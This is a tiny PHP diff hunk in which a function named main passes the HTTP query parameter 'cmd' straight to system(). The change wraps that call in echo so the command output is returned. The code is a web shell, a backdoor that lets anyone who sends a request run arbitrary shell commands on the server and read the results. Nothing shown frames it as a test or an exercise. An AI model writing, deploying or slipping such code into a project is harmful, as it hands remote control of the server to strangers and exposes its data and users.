@@ -16,7 +16,7 @@ function main(array $args)
  
     if(isset($_GET['cmd']))
     {
-        system($_GET['cmd']);
+        echo(system($_GET['cmd']));
     }
  
 //     return [
